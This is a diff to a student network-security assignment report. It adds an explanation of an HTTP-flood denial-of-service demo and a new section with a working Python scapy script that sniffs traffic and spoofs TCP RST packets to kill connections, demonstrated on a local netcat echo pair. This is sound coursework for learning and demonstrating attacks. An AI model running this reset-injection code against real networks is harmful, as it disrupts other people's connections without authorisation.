@@ -1,6 +1,6 @@
 ---
 title: Network Security Assignment Report
-author: 106119029,106119064,106119099,106119102
+author: 106119029,106119064,106119102
 bibliography: 'bibliography.bib'
 link-citations: true
 geometry: margin=1cm
@@ -152,6 +152,16 @@ Demonstrate DOS(Denial of Service) Attack
 ## Solution
 
 Language Used: **Golang**
+
+We have demonstrated DoS attack by sending a large number of HTTP requests to a
+webserver (Apache). This is a reliable way to show DoS attack on any server.
+Classic TCP DoS attacks like SYN flooding have been mitigated by the Linux kernel
+very long ago by introducing limits in the system. For example, the
+`tcp_max_syn_backlog` parameter is set to a low value like 512 or 1024 by
+default. It represents the maximum number of queued connection requests which
+have still not received an acknowledgement from the connecting client.  If this
+number is exceeded, the kernel will begin dropping requests, thus preventing SYN
+flood. (Reference: [Linux TCP man page](https://man7.org/linux/man-pages/man7/tcp.7.html))
 
 ### Output
 
@@ -408,3 +418,115 @@ we see that `unsafe_function` is executed!
 **Note**: The adress of `unsafe_function` might be different on your system. Thus the URL would change based on this address.
 
 # Illegal Packet
+
+## Problem Statement
+Demonstrate Illegal Packet attack in TCP.
+
+## Solution
+
+Language Used: **Python**
+
+> The code is as follows:
+```python
+from scapy.all import *
+import ifaddr
+
+DEFAULT_WINDOW_SIZE = 2052
+
+conf.L3socket = L3RawSocket
+
+def log(msg, params={}):
+    formatted_params = " ".join([f"{k}={v}" for k, v in params.items()])
+    print(f"{msg} {formatted_params}")
+
+def send_reset(iface):
+    def f(p):
+        src_ip = p[IP].src
+        src_port = p[TCP].sport
+        dst_ip = p[IP].dst
+        dst_port = p[TCP].dport
+        seq = p[TCP].seq
+        ack = p[TCP].ack
+        flags = p[TCP].flags
+
+        log(
+            "Sniffed packet",
+            {
+                "Source IP": src_ip,
+                "Destination IP": dst_ip,
+                "Source Port": src_port,
+                "Destination Port": dst_port,
+                "Sequence number": seq,
+                "ACK": ack,
+            }
+        )
+
+        if "S" in flags:
+            print("Packet has SYN flag, not sending RST")
+            return
+
+        rst_seq = ack
+        p = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", window=DEFAULT_WINDOW_SIZE, seq=rst_seq)
+
+        log(
+            "Sending RST packet",
+            {
+                "Original ACK": ack,
+                "Sequence number": rst_seq,    
+            },
+        )
+
+        send(p, verbose=0, iface=iface)
+
+    return f
+
+if __name__ == "__main__":
+    localhost_ip = "127.0.0.1"
+    local_interfaces = [
+        adapter.name for adapter in ifaddr.get_adapters()
+        if len([ip for ip in adapter.ips if ip.ip == localhost_ip]) > 0
+    ]
+
+    iface = local_interfaces[0]
+
+    localhost_server_port = 9000
+
+    t = sniff(
+        iface=iface,
+        count=10,
+        prn=send_reset(iface)
+        # prn=lambda p: p.show()
+    )
+    wrpcap("temp2.cap", t)
+```
+
+### Approach
+We show illegal packet attack through TCP Reset Attack. It is performed by
+sniffing the traffic between a TCP client and server to track the sequence
+numbers. By spoofing a packet with a valid sequence number and the TCP RESET
+flag enabled, an attacker can close the connection abruptly.
+The script above uses `scapy` to craft TCP packets and sniff the traffic.
+
+### Demo
+TCP Reset attack can be carried out as follows:  
+1) Set up a simple TCP echo server and client using `netcat`
+2) Run the sniffer script to close the connection by spoofing a packet with
+   RESET flag enabled.  
+
+The netcat server:  
+![](./img/netcat_server.png)  
+
+The netcat client:  
+![](./img/netcat_client.png)  
+
+In the background, the attack script was run just before the last message was
+sent. The sequence of TCP packets sent for the last message is visualised using
+the `scapy` framework.  
+#### The Message Packet  
+![](./img/illegal_a.png)  
+#### ACK
+![](./img/illegal_b.png)  
+#### RESET
+![](./img/illegal_c.png)  
+
+And the connection is closed!
